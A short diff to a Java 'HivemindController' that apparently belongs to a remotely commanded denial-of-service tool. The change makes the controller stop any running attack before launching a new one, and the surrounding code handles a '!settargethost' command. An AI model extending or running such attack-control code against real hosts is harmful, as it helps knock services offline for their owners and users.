@@ -65,12 +65,13 @@ public class HivemindController {
 	            h += "Cache-Control: no-cache, must-revalidate\r\n";
 	            h += "\r\n";
 	            
-	          //for now let's just hardcode some shit
-//	            File resList = new File(System.getProperty("user.dir") + "/resources.list");
-//	            AttackController.getInstance().LoadResourceList(resList);
-	            
 	            AttackController.getInstance().setAttackHeader(h);
 				
+	            if (AttackController.getInstance().isAttacking()) {
+	                AttackController.getInstance().EndAttack();
+	                Thread.sleep(1000);
+	            }
+	            
 				//ATTACK!
 				AttackController.getInstance().Attack();
 			} else if (c.startsWith("!settargethost"))
